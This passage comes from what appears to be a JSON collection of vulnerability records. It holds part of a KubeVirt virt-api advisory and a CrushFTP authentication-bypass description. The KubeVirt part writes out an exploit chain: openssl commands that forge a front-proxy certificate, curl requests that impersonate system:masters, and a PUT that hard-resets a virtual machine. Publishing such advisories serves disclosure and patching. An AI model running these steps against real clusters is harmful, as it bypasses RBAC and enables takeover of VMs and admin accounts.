pod and could communicate with `virt-api` reachable at `10.244.0.6`.\n\n```bash\nroot@compromised-pod:~$ curl -ks https://10.244.0.6:8443/ | jq .\n{\n  \"paths\": [\n    \"/apis\",\n

]\n}\n```\n\nThe `virt-api` service has two types of endpoints -- authenticated and non-authenticated:\n\n```go\n// pkg/authorizer/authorizer.go\n\nvar noAuthEndpoints = map[string]struct{}{\n\t\"/\":

list is considered an authenticated endpoint and requires a valid client certificate to be presented by the caller.\n\n```bash\n# trying to reach an API endpoint not in the above list would require client authentication\nattacker@compromised-pod:~$ curl -ks https://10.244.0.6:8443/v1\nrequest is not authenticated\n```\n\nTo illustrate the vulnerability and attack scenario, below is generated a certificate signed by the `front-proxy-ca` but issued to an entity which is different than `front-proxy-client` (i.e the certificate has a different CN). Later on, it is assumed that the attacker has obtained access to the certificate bundle:\n\n```bash\nattacker@compromised-pod:~$ openssl ecparam -genkey -name prime256v1 -noout -out rogue-front-proxy.key\nattacker@compromised-pod:~$ openssl req -new -key rogue-front-proxy.key -out rogue-front-proxy.csr -subj \"/CN=crypt0n1t3/O=Quarkslab/C=Fr\"\nattacker@compromised-pod:~$ openssl x509 -req -in rogue-front-proxy.csr -CA front-proxy-ca.crt -CAkey front-proxy-ca.key -CAcreateserial -out\n rogue-front-proxy.crt -days 365\n```\nThe authentication will now succeed:\n\n```bash\nattacker@compromised-pod:~$ curl -ks --cert rogue-front-proxy.crt --key rogue-front-proxy.key  https://10.244.0.6:8443/v1\na valid user header is required for authorization\n```\n\nTo fully exploit the vulnerability, the attacker must also provide valid authentication HTTP headers:\n\n```bash\nattacker@compromised-pod:~$ curl -ks --cert rogue-front-proxy.crt --key rogue-front-proxy.key  -H 'X-Remote-User:system:kube-aggregator' -H '\nX-Remote-Group: system:masters' https://10.244.0.6:8443/v1\nunknown api endpoint: /subresource.kubevirt.io/v1\n```\n\nThe `virt-api` is a sub-resource extension server - it handles only requests for specific resources and sub-resources (requests having URIs prefixed with `/apis/subresources.kubevirt.io/v1/`). In reality, most of the requests that it accepts are actually executed by the `virt-handler` component and are related to the lifecycle of a VM. \n\nHence, `virt-handler`'s API can be seen as aggregated within `virt-api`'s API which in turn transforms it into a proxy. \n\nThe endpoints which are handled by `virt-api` are listed in the Swagger definitions available on GitHub @openapi-spec.\n\n#### Resetting a Virtual Machine Instance \n\nConsider the following deployed `VirtualMachineInstance` (VMI) within the default namespace:\n\n```yaml\napiVersion: kubevirt.io/v1\nkind: VirtualMachineInstance\nmetadata:\n  namespace: default\n  name: mishandling-common-name-in-certificate-default\nspec:\n  domain:\n    devices:\n      disks:\n      - name: containerdisk\n        disk:\n          bus: virtio\n\n      - name: cloudinitdisk\n        disk:\n          bus: virtio\n    resources:\n      requests:\n        memory: 1024M\n  terminationGracePeriodSeconds: 0\n  volumes:\n  - name: containerdisk\n    containerDisk:\n      image: quay.io/kubevirt/cirros-container-disk-demo\n  - name: cloudinitdisk      \n    cloudInitNoCloud:\n      userDataBase64: SGkuXG4=\n```\n\nAn attacker with a stolen external authentication proxy certificate could easily reset (hard reboot), freeze, or remove volumes from the virtual machine.\n\n```bash\nroot@compromised-pod:~$ curl -ki --cert rogue-front-proxy.crt --key rogue-front-proxy.key  -H 'X-Remote-User: system:kube-aggregator' -H 'X-Remote-Group: system:masters' https://10.244.0.6:8443/apis/subresources.kubevirt.io/v1/namespaces/default/virtualmachineinstances/mishandling-common-name-in-certificate-default/reset -XPUT\n\nHTTP/1.1 200 OK\nDate: Sun, 18 May 2025 16:43:26 GMT\nContent-Length: 0\n```\n\n\n### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nThe `virt-api` component may allow an attacker to bypass existing RBAC controls by directly communicating with the aggregated API server, impersonating the Kubernetes API server and its aggregator component.",

    "description": "CrushFTP 10 before 10.8.4 and 11 before 11.3.1 allows authentication bypass and takeover of the crushadmin account (unless a DMZ proxy instance is used), as exploited in the wild in March and April 2025, aka \"Unauthenticated HTTP(S) port access.\" A race condition exists in the AWS4-HMAC (compatible with S3) authorization method of the HTTP component of the FTP server. The server first verifies the existence of the user by performing a call to login_user_pass() with no password requirement. This will authenticate the session through the HMAC verification process and up until the server checks for user verification once more. The vulnerability can be further stabilized, eliminating the need for successfully triggering a race condition, by sending a mangled AWS4-HMAC header. By providing only the username and a following slash (/), the server will successfully find a username, which triggers the successful anypass authentication process, but the server will fail to find the expected SignedHeaders entry, resulting in an index-out-of-bounds error that stops the code from reaching the session cleanup. Together, these issues make it trivial to authenticate as any known or guessable user (e.g., crushadmin), and can lead to a full compromise of the system by obtaining an administrative account.",
